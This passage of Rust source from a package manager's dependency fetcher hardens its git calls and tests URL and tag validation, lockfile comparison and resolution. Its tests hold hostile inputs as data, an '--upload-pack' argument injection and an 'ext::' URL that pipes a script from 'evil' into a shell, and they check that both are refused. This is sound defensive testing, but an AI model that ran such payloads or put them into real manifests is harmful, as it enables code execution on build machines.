        "`{}` is not a git URL this will fetch\n  it takes https://, ssh:// \
         and user@host:path — a local path or a transport such as `ext::` is refused, because \
         a dependency's dependency chose this string",
        url
    ))
}

/// A tag, checked for the same reason a URL is: it reaches `git` as an
/// argument, and one beginning with `-` is an option.
fn check_tag(tag: &str) -> Result<(), String> {
    if tag.starts_with('-') {
        return Err(format!(
            "`{}` begins with `-`, so `git` would read it as an option rather than a tag",
            tag
        ));
    }
    Ok(())
}

/// The hardening every `git` invocation here carries.
///
/// `--` goes before the positional arguments at each call site; this is the
/// rest. Denying every protocol but the two that are asked for closes the
/// local-transport fallback that makes argument injection reach a command, and
/// `GIT_PROTOCOL_FROM_USER=0` makes the `user` policy — which covers `file://`
/// — deny rather than allow, since git treats an unset variable as "a person
/// typed this" and here a manifest did.
fn hardened(command: &mut Command) -> &mut Command {
    command
        .env("GIT_PROTOCOL_FROM_USER", "0")
        .args(["-c", "protocol.allow=never"])
        .args(["-c", "protocol.https.allow=always"])
        .args(["-c", "protocol.ssh.allow=always"])
}

/// Clone a dependency at one tag, without its history.
///
/// `git` is shelled out to rather than reimplemented: it is on every machine
/// that has a compiler, it knows about credentials and proxies, and a
/// hand-rolled fetch would be a second thing to keep secure.
fn clone(url: &str, tag: Option<&str>, into: &PathBuf) -> Result<(), String> {
    check_url(url)?;
    if let Some(tag) = tag {
        check_tag(tag)?;
    }
    if let Some(parent) = into.parent() {
        std::fs::create_dir_all(parent).map_err(|e| format!("cannot create vendor: {}", e))?;
    }
    let mut command = Command::new("git");
    hardened(&mut command);
    command.args(["clone", "--depth", "1", "--quiet"]);
    if let Some(tag) = tag {
        command.args(["--branch", tag]);
    }
    command.arg("--").arg(url).arg(into);
    let out = command
        .output()
        .map_err(|e| format!("cannot run `git`: {}", e))?;
    if !out.status.success() {
        return Err(format!(
            "cloning {} failed:\n{}",
            url,
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- what may be handed to `git` ---------------------------------------
    //
    // A dependency's URL and tag reach `git` as arguments, and both come from a
    // manifest that a dependency's dependency may have written. One beginning
    // with `-` is not a URL, it is an option — and `git ls-remote --tags
    // --upload-pack=…`, left with no repository, falls back to the current
    // directory's own remote and honours it.

    #[test]
    fn a_url_that_is_really_an_option_is_refused() {
        let err = check_url("--upload-pack=touch /tmp/pwned").expect_err("an option, not a URL");
        assert!(err.contains("begins with `-`"), "{}", err);
        let err = check_tag("--upload-pack=touch /tmp/pwned").expect_err("an option, not a tag");
        assert!(err.contains("begins with `-`"), "{}", err);
    }

    /// `ext::` hands the rest of the string to a shell. Modern git denies the
    /// transport by default, so this is not the only thing in the way — but the
    /// URL is attacker-controlled transitively, and defending that on the far
    /// end's default configuration is not defending it.
    #[test]
    fn a_transport_that_runs_a_command_is_refused() {
        for url in [
            "ext::sh -c 'curl https://evil/x|sh'",
            "file:///tmp/anywhere",
            "/tmp/a-local-path",
            "../sibling",
        ] {
            assert!(check_url(url).is_err(), "`{}` should be refused", url);
        }
    }

    #[test]
    fn the_urls_people_actually_write_are_allowed() {
        for url in [
            "https://github.com/example/kite-markdown",
            "ssh://git@github.com/example/repo.git",
            "git@github.com:example/repo.git",
        ] {
            check_url(url).unwrap_or_else(|e| panic!("`{}` should be allowed: {}", url, e));
        }
        check_tag("v1.2.0").expect("an ordinary tag");
    }

    /// `http://` and `git://` used to be on the list above.
    ///
    /// Neither authenticates the host or protects the bytes, and what is
    /// fetched is compiled and run — so anyone on the network path chose what
    /// the build ran. A transitive manifest could name one, which meant the
    /// project being built never agreed to it and could not refuse.
    #[test]
    fn transports_that_authenticate_nothing_are_refused() {
        for url in ["http://internal.example/repo.git", "git://example.com/repo.git"] {
            let error = check_url(url).expect_err("should be refused");
            assert!(
                error.contains("no authentication"),
                "`{}` should be refused for its transport, said: {}",
                url,
                error
            );
        }
    }

    #[test]
    fn ls_remote_output_reads_as_versions_and_their_spellings() {
        let output = "abc1\trefs/tags/v1.2.0\n\
                      abc2\trefs/tags/v1.2.0^{}\n\
                      abc3\trefs/tags/2.0.0\n\
                      abc4\trefs/tags/release-final\n\
                      abc5\trefs/tags/v2.1.0-rc.1\n\
                      abc6\trefs/heads/main\n";
        let found = tag_versions(output);
        assert_eq!(
            found,
            vec![
                (Version::parse("1.2.0").unwrap(), "v1.2.0".to_string()),
                (Version::parse("2.0.0").unwrap(), "2.0.0".to_string()),
                (Version::parse("2.1.0-rc.1").unwrap(), "v2.1.0-rc.1".to_string()),
            ]
        );
    }

    // ---- path-only resolution, end to end, with no network ----------------

    fn fixture(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("kite-pkg-{}-{}", name, std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("create");
        dir
    }

    fn write(path: PathBuf, text: &str) {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).expect("create");
        }
        std::fs::write(path, text).expect("write");
    }

    fn package(dir: &Path, name: &str, version: &str, dependencies: &str) {
        write(
            dir.join(name).join("kite.toml"),
            &format!(
                "[package]\nname = \"{}\"\nversion = \"{}\"\n\n[dependencies]\n{}\n",
                name, version, dependencies
            ),
        );
        write(dir.join(name).join("src/lib.kite"), &format!("fn {}() {{\n}}\n", name));
    }

    /// Resolve with no network and nothing preferred.
    fn lock(root: &Manifest, dir: &Path) -> Result<Resolution, String> {
        lock_dependencies(root, dir, true, false, &BTreeMap::new())
    }

    #[test]
    fn path_dependencies_resolve_transitively_and_lock_with_versions() {
        let dir = fixture("resolves");
        package(
            &dir,
            "app",
            "0.1.0",
            "a = { path = \"../a\", version = \"^1\" }\nb = { path = \"../b\" }",
        );
        package(&dir, "a", "1.2.0", "shared = { path = \"../shared\", version = \">=1.0\" }");
        package(&dir, "b", "0.3.0", "shared = { path = \"../shared\", version = \"<2.0\" }");
        package(&dir, "shared", "1.4.0", "");

        let root_dir = dir.join("app");
        let text = std::fs::read_to_string(root_dir.join("kite.toml")).expect("read");
        let root = manifest::parse(&text).expect("parses");
        // Paths never fetch, so `--offline` resolves them too.
        let resolved = lock(&root, &root_dir).expect("resolves");

        let locked = &resolved.locked;
        let summary: Vec<(String, String)> =
            locked.iter().map(|l| (l.name.clone(), l.version.clone())).collect();
        assert_eq!(
            summary,
            vec![
                ("a".to_string(), "1.2.0".to_string()),
                ("b".to_string(), "0.3.0".to_string()),
                ("shared".to_string(), "1.4.0".to_string()),
            ]
        );
        let lock = manifest::lockfile(locked);
        assert!(lock.contains("version = \"1.4.0\""), "{}", lock);
        // A committed file must read the same on every machine: paths are
        // written relative to the root package, not absolute.
        assert!(lock.contains("source = \"../shared\""), "{}", lock);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_transitive_conflict_names_both_requirers() {
        let dir = fixture("conflicts");
        package(&dir, "app", "0.1.0", "a = { path = \"../a\" }\nb = { path = \"../b\" }");
        package(&dir, "a", "1.2.0", "shared = { path = \"../shared\", version = \">=2.0\" }");
        package(&dir, "b", "0.3.0", "shared = { path = \"../shared\", version = \"<2.0\" }");
        package(&dir, "shared", "1.4.0", "");

        let root_dir = dir.join("app");
        let text = std::fs::read_to_string(root_dir.join("kite.toml")).expect("read");
        let root = manifest::parse(&text).expect("parses");
        let err = lock(&root, &root_dir).expect_err("conflicts");

        assert!(err.contains("no version of `shared`"), "{}", err);
        assert!(err.contains("a 1.2.0"), "{}", err);
        assert!(err.contains("b 0.3.0"), "{}", err);
        assert!(err.contains(">=2.0.0"), "{}", err);
        assert!(err.contains("<2.0.0"), "{}", err);
        assert!(err.contains("1.4.0"), "{}", err);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn one_name_from_two_places_is_refused() {
        let dir = fixture("two-places");
        package(&dir, "app", "0.1.0", "a = { path = \"../a\" }\nb = { path = \"../b\" }");
        package(&dir, "a", "1.0.0", "shared = { path = \"../s1\" }");
        package(&dir, "b", "1.0.0", "shared = { path = \"../s2\" }");
        package(&dir, "s1", "1.0.0", "");
        package(&dir, "s2", "1.0.0", "");
        // `shared` must point at s1 for a and s2 for b — which is two things.
        write(dir.join("s1/kite.toml"), "[package]\nname = \"shared\"\nversion = \"1.0.0\"\n");
        write(dir.join("s2/kite.toml"), "[package]\nname = \"shared\"\nversion = \"1.0.0\"\n");

        let root_dir = dir.join("app");
        let text = std::fs::read_to_string(root_dir.join("kite.toml")).expect("read");
        let root = manifest::parse(&text).expect("parses");
        let err = lock(&root, &root_dir).expect_err("two places");
        assert!(err.contains("two different places"), "{}", err);
        assert!(err.contains("a name means one thing"), "{}", err);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_dependency_without_a_version_cannot_be_ordered() {
        let dir = fixture("versionless");
        package(&dir, "app", "0.1.0", "a = { path = \"../a\" }");
        write(dir.join("a/kite.toml"), "[package]\nname = \"a\"\n");

        let root_dir = dir.join("app");
        let text = std::fs::read_to_string(root_dir.join("kite.toml")).expect("read");
        let root = manifest::parse(&text).expect("parses");
        let err = lock(&root, &root_dir).expect_err("no version");
        assert!(err.contains("declares no version"), "{}", err);
        assert!(err.contains("version = \"0.1.0\""), "{}", err);

        let _ = std::fs::remove_dir_all(&dir);
    }

    // ---- the lockfile is compared entry by entry --------------------------

    /// Adding a dependency is a change to the manifest, said rather than
    /// refused. The lockfile was compared as a whole text, so this failed
    /// claiming a dependency's contents had changed under the same version.
    #[test]
    fn adding_a_dependency_is_reported_not_refused() {
        let dir = fixture("adding");
        package(&dir, "app", "0.1.0", "a = { path = \"../a\" }");
        package(&dir, "a", "1.0.0", "");
        package(&dir, "b", "1.0.0", "");
        let app = dir.join("app");
        sync(&app, true, false).expect("the first lock");

        package(&dir, "app", "0.1.0", "a = { path = \"../a\" }\nb = { path = \"../b\" }");
        sync(&app, true, false).expect("an added dependency is not a moved one");
        let lock = std::fs::read_to_string(app.join("kite.lock")).expect("read");
        assert!(lock.contains("name = \"b\""), "{}", lock);

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// What the lockfile exists to catch still fails: the same name, version
    /// and source, and different bytes. `--update` accepts it.
    #[test]
    fn bytes_that_moved_under_one_version_are_refused() {
        let dir = fixture("moved");
        package(&dir, "app", "0.1.0", "a = { path = \"../a\" }");
        package(&dir, "a", "1.0.0", "");
        let app = dir.join("app");
        sync(&app, true, false).expect("the first lock");
        let agreed = std::fs::read_to_string(app.join("kite.lock")).expect("read");

        write(dir.join("a/src/lib.kite"), "fn a() {\n    io.print(1)\n}\n");
        let err = sync(&app, true, false).expect_err("the bytes moved");
        assert!(err.contains("does not match what resolution produced"), "{}", err);
        assert!(err.contains("a 1.0.0"), "names the dependency: {}", err);
        assert_eq!(
            std::fs::read_to_string(app.join("kite.lock")).expect("read"),
            agreed,
            "a refused lockfile is left as it was"
        );

        sync(&app, true, true).expect("--update accepts it");
        assert_ne!(std::fs::read_to_string(app.join("kite.lock")).expect("read"), agreed);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_comparison_separates_moved_bytes_from_manifest_changes() {
        let entry = |name: &str, version: &str, source: &str, hash: &str| Locked {
            name: name.into(),
            version: version.into(),
            source: source.into(),
            hash: hash.into(),
        };
        let before = vec![
            entry("a", "1.0.0", "../a", "11"),
            entry("b", "1.0.0", "../b", "22"),
            entry("c", "1.0.0", "../c", "33"),
            entry("gone", "1.0.0", "../gone", "44"),
        ];
        let after = vec![
            entry("a", "1.0.0", "../a", "99"),
            entry("b", "1.1.0", "../b", "55"),
            entry("c", "1.0.0", "../c2", "66"),
            entry("new", "0.1.0", "../new", "77"),
        ];
        let changes = compare(&before, &after);
        assert_eq!(changes.moved, vec!["a 1.0.0: 99 was 11".to_string()]);
        assert_eq!(
            changes.notes,
            vec![
                "b 1.0.0 → 1.1.0".to_string(),
                "c 1.0.0 now comes from ../c2 (was ../c)".to_string(),
                "added new 0.1.0".to_string(),
                "removed gone 1.0.0".to_string(),
            ]
        );
    }

    /// `--update` fetches a checkout again rather than trusting the one on
    /// disk — once per run, and never under `--offline`.
    #[test]
    fn update_fetches_a_cached_checkout_again() {
        assert_eq!(fetch_plan(true, false, false, false), Fetch::Keep);
        assert_eq!(fetch_plan(true, true, false, false), Fetch::Replace);
        assert_eq!(fetch_plan(true, true, true, false), Fetch::Keep, "once per run");
        assert_eq!(fetch_plan(true, true, false, true), Fetch::Keep, "offline keeps what it has");
        assert_eq!(fetch_plan(false, false, false, false), Fetch::Clone);
        assert_eq!(fetch_plan(false, true, false, true), Fetch::Unavailable);
    }

    /// A refetch that fails leaves the checkout it would have replaced. The
    /// old one was removed before the clone began, so a failed `--update`
    /// took `--offline` down with it.
    #[test]
    fn a_failed_refetch_keeps_the_checkout_it_would_have_replaced() {
        let dir = fixture("refetch");
        let checkout = dir.join(".kite/vendor/a@1.0.0");
        write(checkout.join("kite.toml"), "[package]\nname = \"a\"\nversion = \"1.0.0\"\n");
        write(checkout.join("a.kite"), "pub fn v() -> str {\n    return \"1.0.0\"\n}\n");
        let mut vendor = Vendor::new(&dir, false, true);
        // A transport refused before `git` runs, so the fetch fails without a
        // network to fail on.
        let why = vendor
            .checkout("a", "http://example.invalid/a", "v1.0.0", &checkout)
            .expect_err("the fetch fails");
        assert!(why.contains("left as it was"), "{}", why);
        assert!(checkout.join("a.kite").is_file(), "the checkout is gone");
        assert!(!dir.join(".kite/vendor/a@1.0.0.fetching").exists());
        // And `--offline` still resolves from it.
        let mut offline = Vendor::new(&dir, true, false);
        offline.checkout("a", "http://example.invalid/a", "v1.0.0", &checkout).expect("kept");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A candidate the solver unwinds takes back what its manifest taught.
    #[test]
    fn an_unwound_candidate_releases_the_sources_it_named() {
        let dir = fixture("unwind");
        let mut vendor = Vendor::new(&dir, true, false);
        let old = Origin::Git { url: "https://old.example/shared".into(), tag: None };
        let new = Origin::Git { url: "https://new.example/shared".into(), tag: None };
        vendor.register("a 2.0.0", "shared", old.clone()).expect("first");
        assert!(vendor.register("a 1.0.0", "shared", new.clone()).is_err());
        vendor.unwind("a", &Version::parse("2.0.0").expect("version"));
        vendor.register("a 1.0.0", "shared", new).expect("the old claim is gone");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
